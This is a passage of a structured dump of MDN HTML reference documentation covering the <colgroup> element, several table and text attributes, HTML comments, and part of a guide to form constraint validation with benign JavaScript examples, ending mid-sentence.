  description: "# \\<colgroup\\>: The Table Column Group element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fcolgroup&level=high)\n\nThe `<colgroup>` [HTML](../index) element defines a group of columns within a table.\n\n## Try it\n\n#### HTML Demo: \\<colgroup\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <table>\n      <caption>\n        Superheros and sidekicks\n      </caption>\n      <colgroup>\n        <col />\n        <col span=\"2\" class=\"batman\" />\n        <col span=\"2\" class=\"flash\" />\n      </colgroup>\n      <tr>\n        <td></td>\n        <th scope=\"col\">Batman</th>\n        <th scope=\"col\">Robin</th>\n        <th scope=\"col\">The Flash</th>\n        <th scope=\"col\">Kid Flash</th>\n      </tr>\n      <tr>\n        <th scope=\"row\">Skill</th>\n        <td>Smarts, strong</td>\n        <td>Dex, acrobat</td>\n        <td>Super speed</td>\n        <td>Super speed</td>\n      </tr>\n    </table>\n\n    .batman {\n      background-color: #d7d9f2;\n    }\n\n    .flash {\n      background-color: #ffe8d4;\n    }\n\n    table {\n      border-collapse: collapse;\n      border: 2px solid rgb(140 140 140);\n      font-family: sans-serif;\n      font-size: 0.8rem;\n      letter-spacing: 1px;\n    }\n\n    caption {\n      caption-side: bottom;\n      padding: 10px;\n    }\n\n    th,\n    td {\n      border: 1px solid rgb(160 160 160);\n      padding: 8px 6px;\n    }\n\n    td {\n      text-align: center;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n[`span`](#span)  \nSpecifies the number of consecutive columns the `<colgroup>` element spans. The value must be a positive integer greater than zero. If not present, its default value is `1`.\n\n**Note:** The `span` attribute is not permitted if there are one or more [`<col>`](col) elements within the `<colgroup>`.\n\n### Deprecated attributes\n\nThe following attributes are deprecated and should not be used. They are documented below for reference when updating existing code and for historical interest only.\n\n[`align`](#align) Deprecated  \nSpecifies the horizontal alignment of each column group cell. The possible [enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated) values are `left`, `center`, `right`, `justify`, and `char`. When supported, the `char` value aligns the textual content on the character defined in the [`char`](#char) attribute and the offset defined by the [`charoff`](#charoff) attribute. Note that the descendant [`<col>`](col) elements may override this value using their own [`align`](col#align) attribute. Use the [`text-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/text-align) CSS property on the [`<td>`](td) and [`<th>`](th) elements instead, as this attribute is deprecated.\n\n**Note:** Setting `text-align` on the `<colgroup>` element has no effect as [`<td>`](td) and [`<th>`](th) elements are not descendants of the `<colgroup>` element, and therefore they do not inherit from it.\n\nIf the table does not use a [`colspan`](td#colspan) attribute, use the `td:nth-of-type(an+b)` CSS selector per column, where `a` is the total number of the columns in the table and `b` is the ordinal position of the column in the table, e.g. `td:nth-of-type(7n+2) { text-align: right; }` to right-align the second column cells.\n\nIf the table does use a [`colspan`](td#colspan) attribute, the effect can be achieved by combining adequate CSS attribute selectors like `[colspan=n]`, though this is not trivial.\n\n[`bgcolor`](#bgcolor) Deprecated  \nDefines the background color of each column group cell. The value is an HTML color; either a [6-digit hexadecimal RGB code](https://developer.mozilla.org/en-US/docs/Web/CSS/hex-color), prefixed by a '`#`', or a [color keyword](https://developer.mozilla.org/en-US/docs/Web/CSS/named-color). Other CSS [`<color>`](https://developer.mozilla.org/en-US/docs/Web/CSS/color_value) values are not supported. Use the [`background-color`](https://developer.mozilla.org/en-US/docs/Web/CSS/background-color) CSS property instead, as this attribute is deprecated.\n\n[`char`](#char) Deprecated  \nDoes nothing. It was originally intended to specify the alignment of the content to a character of each column group cell. Typical values for this include a period (`.`) when attempting to align numbers or monetary values. If [`align`](#align) is not set to `char`, this attribute is ignored, though it will still be used as the default value for the [`align`](col#align) of the [`<col>`](col) elements which are members of this column group.\n\n[`charoff`](#charoff) Deprecated  \nDoes nothing. It was originally intended to specify the number of characters to offset the column group cell content from the alignment character specified by the [`char`](#char) attribute.\n\n[`valign`](#valign) Deprecated  \nSpecifies the vertical alignment of each column group cell. The possible [enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated) values are `baseline`, `bottom`, `middle`, and `top`. Note that the descendant [`<col>`](col) elements may override this value using their own [`valign`](col#valign) attribute. Use the [`vertical-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/vertical-align) CSS property on the [`<td>`](td) and [`<th>`](th) elements instead, as this attribute is deprecated.\n\n**Note:** Setting `vertical-align` on the `<colgroup>` element has no effect as [`<td>`](td) and [`<th>`](th) elements are not descendants of the `<colgroup>` element, and therefore they do not inherit from it.\n\nIf the table does not use a [`colspan`](td#colspan) attribute, use the [`td:nth-of-type()`](https://developer.mozilla.org/en-US/docs/Web/CSS/:nth-of-type) CSS selector per column, e.g. `td:nth-of-type(2) { vertical-align: middle; }` to center the second column cells vertically.\n\nIf the table does use a [`colspan`](td#colspan) attribute, the effect can be achieved by combining adequate CSS attribute selectors like `[colspan=n]`, though this is not trivial.\n\n[`width`](#width) Deprecated  \nSpecifies a default width for each column in the current column group. In addition to the standard pixel and percentage values, this attribute can take the special form `0*`, which means that the width of each column spanned should be the minimum width necessary to hold the column's contents. Relative widths such as `5*` can also be used. Note that the descendant [`<col>`](col) elements may override this value using their own [`width`](col#width) attribute. Use the [`width`](https://developer.mozilla.org/en-US/docs/Web/CSS/width) CSS property instead, as this attribute is deprecated.\n\n## Usage notes\n\n- The `<colgroup>` should appear within a [`<table>`](table), after any [`<caption>`](caption) element (if used), but before any [`<thead>`](thead), [`<tbody>`](tbody), [`<tfoot>`](tfoot), and [`<tr>`](tr) elements.\n- Only a limited number of CSS properties affect `<colgroup>`:\n  - [`background`](https://developer.mozilla.org/en-US/docs/Web/CSS/background) : The various `background` properties will set the background for cells within the column group. As the column group background color is painted on top of the table, but behind background colors applied to the columns ([`<col>`](col)), the row groups ([`<thead>`](thead), [`<tbody>`](tbody), and [`<tfoot>`](tfoot)), the rows ([`<tr>`](tr)), and the individual cells ([`<th>`](th) and [`<td>`](td)), backgrounds applied to table column groups are only visible if every layer painted on top of them has a transparent background.\n  - [`border`](https://developer.mozilla.org/en-US/docs/Web/CSS/border): The various `border` properties apply, but only if the `<table>` has [`border-collapse: collapse`](https://developer.mozilla.org/en-US/docs/Web/CSS/border-collapse) set.\n  - [`visibility`](https://developer.mozilla.org/en-US/docs/Web/CSS/visibility): The value `collapse` for a column group results in all cells of the columns in that column group not being rendered, and cells spanning into other columns being clipped. The space these columns in the column group would have occupied is removed. However, the size of other columns is still calculated as though the cells in the collapsed column(s) in the column group are present. Other values for `visibility` have no effect.\n  - [`width`](https://developer.mozilla.org/en-US/docs/Web/CSS/width): The `width` property defines a minimum width for the columns within the column group, as if [`min-width`](https://developer.mozilla.org/en-US/docs/Web/CSS/min-width) were set.\n\n## Example\n\nSee [`<table>`](table) for a complete table example introducing common standards and best practices.\n\nThis example demonstrates a seven-column table divided into two `<colgroup>` elements that span multiple columns.\n\n### HTML\n\nTwo `<colgroup>` elements are used to structure a basic table by creating column groups. The number of columns in each column group is specified by the [`span`](#span) attribute.\n\nhtml\n\n```\n<table>\n  <caption>\n    Personal weekly activities\n  </caption>\n  <colgroup span=\"5\" class=\"weekdays\"></colgroup>\n  <colgroup span=\"2\" class=\"weekend\"></colgroup>\n  <tr>\n    <th>Mon</th>\n    <th>Tue</th>\n    <th>Wed</th>\n    <th>Thu</th>\n    <th>Fri</th>\n    <th>Sat</th>\n    <th>Sun</th>\n  </tr>\n  <tr>\n    <td>Clean room</td>\n    <td>Football training</td>\n    <td>Dance Course</td>\n    <td>History Class</td>\n    <td>Buy drinks</td>\n    <td>Study hour</td>\n    <td>Free time</td>\n  </tr>\n  <tr>\n    <td>Yoga</td>\n    <td>Chess Club</td>\n    <td>Meet friends</td>\n    <td>Gymnastics</td>\n    <td>Birthday party</td>\n    <td>Fishing trip</td>\n    <td>Free time</td>\n  </tr>\n</table>\n```\n\n### CSS\n\nGrouped columns can be used to visually highlight the structure using CSS:\n\ncss\n\n```\ntable {\n  border-collapse: collapse;\n  border: 2px solid rgb(140 140 140);\n}\n\ncaption {\n  caption-side: bottom;\n  padding: 10px;\n}\n\nth,\ntd {\n  border: 1px solid rgb(160 160 160);\n  padding: 8px 6px;\n  text-align: center;\n}\n\n.weekdays {\n  background-color: #d7d9f2;\n}\n\n.weekend {\n  background-color: #ffe8d4;\n}\n```\n\n#### Result\n\n## Technical summary\n\n[TABLE]\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|            | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|------------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|            | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `colgroup` | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n| `align`    | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `char`     | 1       | 12   | No      | 15    | 3      | 18             | No                  | 14            | 2             | 1.0              | 4.4             |     |\n| `charoff`  | 1       | 12   | No      | 15    | 3      | 18             | No                  | 14            | 2             | 1.0              | 4.4             |     |\n| `span`     | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n| `valign`   | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `width`    | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n\n## See also\n\n- [Learn: HTML tables](https://developer.mozilla.org/en-US/docs/Learn/HTML/Tables)\n- [`<caption>`](caption), [`<col>`](col), [`<table>`](table), [`<tbody>`](tbody), [`<td>`](td), [`<tfoot>`](tfoot), [`<th>`](th), [`<thead>`](thead), [`<tr>`](tr): Other table-related elements\n- [`background-color`](https://developer.mozilla.org/en-US/docs/Web/CSS/background-color): CSS property to set the background color of each column group cell\n- [`border`](https://developer.mozilla.org/en-US/docs/Web/CSS/border): CSS property to control borders of column group cells\n- [`text-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/text-align): CSS property to horizontally align each column group cell content\n- [`vertical-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/vertical-align): CSS property to vertically align each column group cell content\n- [`visibility`](https://developer.mozilla.org/en-US/docs/Web/CSS/visibility): CSS property to hide (or show) cells of a column group\n- [`width`](https://developer.mozilla.org/en-US/docs/Web/CSS/width): CSS property to control the default width for each column in a column group\n- [`:nth-of-type`](https://developer.mozilla.org/en-US/docs/Web/CSS/:nth-of-type), [`:first-of-type`](https://developer.mozilla.org/en-US/docs/Web/CSS/:first-of-type), [`:last-of-type`](https://developer.mozilla.org/en-US/docs/Web/CSS/:last-of-type): CSS pseudo-classes to select the desired column cells\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/colgroup](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/colgroup)"
- name: color (attribute)
  summary: 'This attribute sets the text color using either a named color or a color specified in the hexadecimal #RRGGBB format'
  belongs_to: Attributes
  description: |-
    `color`

    [`<font>`](element/font), [`<hr>`](element/hr)

    This attribute sets the text color using either a named color or a color specified in the hexadecimal \#RRGGBB format.

    **Note:** This is a legacy attribute. Please use the CSS [`color`](https://developer.mozilla.org/en-US/docs/Web/CSS/color) property instead.
- name: cols (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`cols`](element/textarea#cols)

    [`<textarea>`](element/textarea)

    Defines the number of columns in a textarea.
- name: colspan (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`colspan`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/colspan)

    [`<td>`](element/td), [`<th>`](element/th)

    The colspan attribute defines the number of columns a cell should span.
- name: Comments
  summary: An HTML comment is used to add explanatory notes to the markup or to prevent the browser from interpreting specific parts of the document
  description: "# Comments\n\nAn HTML **comment** is used to add explanatory notes to the markup or to prevent the browser from interpreting specific parts of the document.\n\nComments start with the string `<!--` and end with the string `-->`, generally with text in between. This text cannot start with the string `>` or `->`, cannot contain the strings `-->` or `--!>`, nor end with the string `<!-`, though `<!` is allowed.\n\nThe browser ignores comments as it renders the code. In other words, they are not visible on the page - just in the code. HTML comments are a way for you to write helpful notes about your code or logic.\n\nThe above is true for [XML](https://developer.mozilla.org/en-US/docs/Web/XML) comments as well. In addition, in XML, such as in [SVG](https://developer.mozilla.org/en-US/docs/Web/SVG) or [MathML](https://developer.mozilla.org/en-US/docs/Web/MathML) markup, a comment cannot contain the character sequence `--`.\n\nComments can be used on a single line, or span multiple lines. They can be used in the following places:\n\n- Before and after the [Doctype](https://developer.mozilla.org/en-US/docs/Glossary/Doctype)\n- Before and after the [`<html>`](element/html) element\n- As the content of most elements except: [`<script>`](element/script), [`<style>`](element/style), [`<title>`](element/title), [`<textarea>`](element/textarea), because these elements interpret their content as raw text\n\n**Note:** While `<script>` elements should not have HTML comments and should use [JavaScript comments](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Lexical_grammar#comments) instead, there was a legacy practice to enclose the whole script content in an HTML comment so ancient browsers that don't support JavaScript don't render it as text. This is now a [legacy feature of JavaScript itself](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Deprecated_and_obsolete_features#html_comments) and you should not rely on it.\n\n## Syntax\n\nhtml\n\n```\n<!-- Comment -->\n```\n\n## Examples\n\nhtml\n\n```\n<!-- A one-line comment -->\n\n<!--\nA comment\nthat stretches\nover several\nlines\n-->\n\n<!-- The comment below disables\n   the HTML contained within -->\n<!--\n<p>\n   This content will not be rendered.\n</p>\n-->\n```\n\n## Notes\n\nHTML comments are only permitted as content. You cannot use it within a tag, such as before an HTML [attribute](https://developer.mozilla.org/en-US/docs/Glossary/Attribute).\n\nAs with most programming languages that use the `<!-- -->` comment syntax, comments cannot be nested. In other words, the first instance of `-->` that follows an instance of `<!--` closes the comment.\n\nWhile comments do start with a `<` and end in a `>`, a comment is not an HTML element.\n\n## Specifications\n\n[TABLE]\n\n## See also\n\n- [Comments in JavaScript](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Lexical_grammar#comments)\n- [Comments in CSS](https://developer.mozilla.org/en-US/docs/Web/CSS/Comments)\n- [`Comment`](https://developer.mozilla.org/en-US/docs/Web/API/Comment) API (`Comment` inherits from [`Node`](https://developer.mozilla.org/en-US/docs/Web/API/Node))\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Comments](https://developer.mozilla.org/en-US/docs/Web/HTML/Comments)"
- name: Constraint validation
  summary: The creation of web forms has always been a complex task
  description: "# Constraint validation\n\nThe creation of web forms has always been a complex task. While marking up the form itself is easy, checking whether each field has a valid and coherent value is more difficult, and informing the user about the problem may become a headache. [HTML5](https://developer.mozilla.org/en-US/docs/Glossary/HTML5) introduced new mechanisms for forms: it added new semantic types for the [`<input>`](element/input) element and *constraint validation* to ease the work of checking the form content on the client side. Basic, usual constraints can be checked, without the need for JavaScript, by setting new attributes; more complex constraints can be tested using the Constraint Validation API.\n\nFor a basic introduction to these concepts, with examples, see the [Form validation tutorial](https://developer.mozilla.org/en-US/docs/Learn/Forms/Form_validation).\n\n**Note:** HTML Constraint validation doesn't remove the need for validation on the *server side*. Even though far fewer invalid form requests are to be expected, invalid ones can still be sent in many ways:\n\n- By modifying HTML via the browser's developer tools.\n- By hand-crafting an HTTP request without using the form.\n- By programmatically writing content into the form (certain constraint validations are *only run* for user input, and not if you set the value of a form field using JavaScript).\n\nTherefore, you should always validate form data on the server side, consistent with what is done on the client side.\n\n## Intrinsic and basic constraints\n\nIn HTML, basic constraints are declared in two ways:\n\n- By choosing the most semantically appropriate value for the [`type`](element/input#type) attribute of the [`<input>`](element/input) element, e.g., choosing the `email` type automatically creates a constraint that checks whether the value is a valid email address.\n- By setting values on validation-related attributes, allowing basic constraints to be described in a simple way, without the need for JavaScript.\n\n### Semantic input types\n\nThe intrinsic constraints for the [`type`](element/input#type) attribute are:\n\n| Input type                                    | Constraint description                                                                                                                                                                                   | Associated violation                                                                                                 |\n|-----------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------|\n| [`<input type=\"URL\">`](element/input/url)     | The value must be an absolute [URL](https://developer.mozilla.org/en-US/docs/Learn/Common_questions/Web_mechanics/What_is_a_URL), as defined in the [URL Living Standard](https://url.spec.whatwg.org/). | **[TypeMismatch](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/typeMismatch)** constraint violation |\n| [`<input type=\"email\">`](element/input/email) | The value must be a syntactically valid email address, which generally has the format `username@hostname.tld` but can also be local such as `username@hostname`.                                         | **[TypeMismatch](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/typeMismatch)** constraint violation |\n\nFor both of these input types, if the [`multiple`](element/input#multiple) attribute is set, several values can be set, as a comma-separated list. If any of these do not satisfy the condition described here, the **Type mismatch** constraint violation is triggered.\n\nNote that most input types don't have intrinsic constraints, as some are barred from constraint validation or have a sanitization algorithm transforming incorrect values to a correct default.\n\n### Validation-related attributes\n\nIn addition to the `type` attribute described above, the following attributes are used to describe basic constraints:\n\n| Attribute                           | Input types supporting the attribute                                                                                                                                                                                                  | Possible values                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | Constraint description                                                                                                                                                                                                    | Associated violation                                                                                                     |\n|-------------------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------------------|\n| [`pattern`](attributes/pattern)     | `text`, `search`, `url`, `tel`, `email`, `password`                                                                                                                                                                                   | A [JavaScript regular expression](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_expressions) (compiled with the [`global`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/global), [`ignoreCase`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/ignoreCase), and [`multiline`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/multiline) flags *disabled*) | The value must match the pattern.                                                                                                                                                                                         | [`patternMismatch`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/patternMismatch) constraint violation |\n| [`min`](attributes/min)             | `range`, `number`                                                                                                                                                                                                                     | A valid number                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | The value must be greater than or equal to the value.                                                                                                                                                                     | [`rangeUnderflow`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/rangeUnderflow) constraint violation   |\n|                                     | `date`, `month`, `week`                                                                                                                                                                                                               | A valid date                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |                                                                                                                                                                                                                           |                                                                                                                          |\n|                                     | `datetime-local`, `time`                                                                                                                                                                                                              | A valid date and time                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                           |                                                                                                                          |\n| [`max`](attributes/max)             | `range`, `number`                                                                                                                                                                                                                     | A valid number                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 | The value must be less than or equal to the value                                                                                                                                                                         | [`rangeOverflow`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/rangeOverflow) constraint violation     |\n|                                     | `date`, `month`, `week`                                                                                                                                                                                                               | A valid date                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |                                                                                                                                                                                                                           |                                                                                                                          |\n|                                     | `datetime-local`, `time`                                                                                                                                                                                                              | A valid date and time                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                           |                                                                                                                          |\n| [`required`](attributes/required)   | `text`, `search`, `url`, `tel`, `email`, `password`, `date`, `datetime-local`, `month`, `week`, `time`, `number`, `checkbox`, `radio`, `file`; also on the [`<select>`](element/select) and [`<textarea>`](element/textarea) elements | *none* as it is a Boolean attribute: its presence means *true*, its absence means *false*                                                                                                                                                                                                                                                                                                                                                                                                                      | There must be a value (if set).                                                                                                                                                                                           | [`valueMissing`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/valueMissing) constraint violation       |\n| [`step`](attributes/step)           | `date`                                                                                                                                                                                                                                | An integer number of days                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      | Unless the step is set to the `any` literal, the value must be **min** + an integral multiple of the step.                                                                                                                | [`stepMismatch`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/stepMismatch) constraint violation       |\n|                                     | `month`                                                                                                                                                                                                                               | An integer number of months                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |                                                                                                                                                                                                                           |                                                                                                                          |\n|                                     | `week`                                                                                                                                                                                                                                | An integer number of weeks                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |                                                                                                                                                                                                                           |                                                                                                                          |\n|                                     | `datetime-local`, `time`                                                                                                                                                                                                              | An integer number of seconds                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |                                                                                                                                                                                                                           |                                                                                                                          |\n|                                     | `range`, `number`                                                                                                                                                                                                                     | An integer                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |                                                                                                                                                                                                                           |                                                                                                                          |\n| [`minlength`](attributes/minlength) | `text`, `search`, `url`, `tel`, `email`, `password`; also on the [`<textarea>`](element/textarea) element                                                                                                                             | An integer length                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | The number of characters (code points) must not be less than the value of the attribute, if non-empty. All newlines are normalized to a single character (as opposed to CRLF pairs) for [`<textarea>`](element/textarea). | [`tooShort`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/tooShort) constraint violation               |\n| [`maxlength`](attributes/maxlength) | `text`, `search`, `url`, `tel`, `email`, `password`; also on the [`<textarea>`](element/textarea) element                                                                                                                             | An integer length                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | The number of characters (code points) must not exceed the value of the attribute.                                                                                                                                        | [`tooLong`](https://developer.mozilla.org/en-US/docs/Web/API/ValidityState/tooLong) constraint violation                 |\n\n## Constraint validation process\n\nConstraint validation is done through the Constraint Validation API either on a single form element or at the form level, on the [`<form>`](element/form) element itself. The constraint validation is done in the following ways:\n\n- By a call to the `checkValidity()` or `reportValidity()` method of a form-associated DOM interface, ([`HTMLInputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement), [`HTMLSelectElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLSelectElement), [`HTMLButtonElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLButtonElement), [`HTMLOutputElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLOutputElement) or [`HTMLTextAreaElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLTextAreaElement)), which evaluates the constraints only on this element, allowing a script to get this information. The `checkValidity()` method returns a Boolean indicating whether the element's value passes its constraints. (This is typically done by the user-agent when determining which of the CSS pseudo-classes, [`:valid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:valid) or [`:invalid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:invalid), applies.) In contrast, the `reportValidity()` method reports any constraint failures to the user.\n- By a call to the `checkValidity()` or `reportValidity()` method on the [`HTMLFormElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLFormElement) interface.\n- By submitting the form itself.\n\nCalling `checkValidity()` is called *statically* validating the constraints, while calling `reportValidity()` or submitting the form is called *interactively* validating the constraints.\n\n**Note:**\n\n- If the [`novalidate`](element/form#novalidate) attribute is set on the [`<form>`](element/form) element, interactive validation of the constraints doesn't happen.\n- Calling the `submit()` method on the [`HTMLFormElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLFormElement) interface doesn't trigger a constraint validation. In other words, this method sends the form data to the server even if it doesn't satisfy the constraints. Call the `click()` method on a submit button instead.\n- The `minlength` and `maxlength` constraints are only checked on user-provided input. They are not checked if a value is set programmatically, even when explicitly calling `checkValidity()` or `reportValidity()`.\n\n## Complex constraints using the Constraint Validation API\n\nUsing JavaScript and the Constraint API, it is possible to implement more complex constraints, for example, constraints combining several fields, or constraints involving complex calculations.\n\nBasically, the idea is to trigger JavaScript on some form field event (like **onchange**) to calculate whether the constraint is violated, and then to use the method `field.setCustomValidity()` to set the result of the validation: an empty string means the constraint is satisfied, and any other string means there is an error and this string is the error message to display to the user.\n\n### Constraint combining several fields: Postal code validation\n\nThe postal code format varies from one country to another. Not only do most countries allow an optional prefix with the country code (like `D-` in Germany, `F-` in France or Switzerland), but some countries have postal codes with only a fixed number of digits; others, like the UK, have more complex structures, allowing letters at some specific positions.\n\n**Note:** This is not a comprehensive postal code validation library, but rather a demonstration of the key concepts.\n\nAs an example, we will add a script checking the constraint validation for this simple form:\n\nhtml\n\n```\n<form>\n  <label for=\"ZIP\">ZIP : </label>\n  <input type=\"text\" id=\"ZIP\" />\n  <label for=\"Country\">Country : </label>\n  <select id=\"Country\">\n    <option value=\"ch\">Switzerland</option>\n    <option value=\"fr\">France</option>\n    <option value=\"de\">Germany</option>\n    <option value=\"nl\">The Netherlands</option>\n  </select>\n  <input type=\"submit\" value=\"Validate\" />\n</form>\n```\n\nThis displays the following form:\n\nFirst, we write a function checking the constraint itself:\n\njs\n\n```\nfunction checkZIP() {\n  // For each country, defines the pattern that the ZIP has to follow\n  const constraints = {\n    ch: [\n      \"^(CH-)?\\\\d{4}$\",\n      \"Switzerland ZIPs must have exactly 4 digits: e.g. CH-1950 or 1950\",\n    ],\n    fr: [\n      \"^(F-)?\\\\d{5}$\",\n      \"France ZIPs must have exactly 5 digits: e.g. F-75012 or 75012\",\n    ],\n    de: [\n      \"^(D-)?\\\\d{5}$\",\n      \"Germany ZIPs must have exactly 5 digits: e.g. D-12345 or 12345\",\n    ],\n    nl: [\n      \"^(NL-)?\\\\d{4}\\\\s*([A-RT-Z][A-Z]|S[BCE-RT-Z])$\",\n      \"Netherland ZIPs must have exactly 4 digits, followed by 2 letters except SA, SD and SS\",\n    ],\n  };\n\n  // Read the country id\n  const country = document.getElementById(\"Country\").value;\n\n  // Get the NPA field\n  const ZIPField = document.getElementById(\"ZIP\");\n\n  // Build the constraint checker\n  const constraint = new RegExp(constraints[country][0], \"\");\n  console.log(constraint);\n\n  // Check it!\n  if (constraint.test(ZIPField.value)) {\n    // The ZIP follows the constraint, we use the ConstraintAPI to tell it\n    ZIPField.setCustomValidity(\"\");\n  } else {\n    // The ZIP doesn't follow the constraint, we use the ConstraintAPI to\n    // give a message about the format required for this country\n    ZIPField.setCustomValidity(constraints[country][1]);\n  }\n}\n```\n\nThen we link it to the **onchange** event for the [`<select>`](element/select) and the **oninput** event for the [`<input>`](element/input):\n\njs\n\n```\nwindow.onload = () => {\n  document.getElementById(\"Country\").onchange = checkZIP;\n  document.getElementById(\"ZIP\").oninput = checkZIP;\n};\n```\n\n### Limiting the size of a file before its upload\n\nAnother common constraint is to limit the size of a file to be uploaded. Checking this on the client side before the file is transmitted to the server requires combining the Constraint Validation API, and especially the `field.setCustomValidity()` method, with another JavaScript API, here the File API.\n\nHere is the HTML part:\n\nhtml\n\n```\n<label for=\"FS\">Select a file smaller than 75 kB : </label>\n<input type=\"file\" id=\"FS\" />\n```\n\nThis displays:\n\nThe JavaScript reads the file selected, uses the `File.size()` method to get its size, compares it to the (hard coded) limit, and calls the Constraint API to inform the browser if there is a violation:\n\njs\n\n```\nfunction checkFileSize() {\n  const FS = document.getElementById(\"FS\");\n  const files = FS.files;\n\n  // If there is (at least) one file selected\n  if (files.length > 0) {\n    if (files[0].size > 75 * 1024) {\n      // Check the constraint\n      FS.setCustomValidity(\"The selected file must not be larger than 75 kB\");\n      FS.reportValidity();\n      return;\n    }\n  }\n  // No custom constraint violation\n  FS.setCustomValidity(\"\");\n}\n```\n\nFinally, we hook the method with the correct event:\n\njs\n\n```\nwindow.onload = () => {\n  document.getElementById(\"FS\").onchange = checkFileSize;\n};\n```\n\n## Visual styling of constraint validation\n\nApart from setting constraints, web developers want to control what messages are displayed to the users and how they are styled.\n\n### Controlling the look of elements\n\nThe look of elements can be controlled via CSS pseudo-classes.\n\n#### :required and :optional CSS pseudo-classes\n\nThe [`:required`](https://developer.mozilla.org/en-US/docs/Web/CSS/:required) and [`:optional`](https://developer.mozilla.org/en-US/docs/Web/CSS/:optional) [pseudo-classes](https://developer.mozilla.org/en-US/docs/Web/CSS/Pseudo-classes) allow writing selectors that match form elements that have the [`required`](element/input#required) attribute, or that don't have it.\n\n#### :placeholder-shown CSS pseudo-class\n\nSee [`:placeholder-shown`](https://developer.mozilla.org/en-US/docs/Web/CSS/:placeholder-shown).\n\n#### :valid :invalid CSS pseudo-classes\n\nThe [`:valid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:valid) and [`:invalid`](https://developer.mozilla.org/en-US/docs/Web/CSS/:invalid) 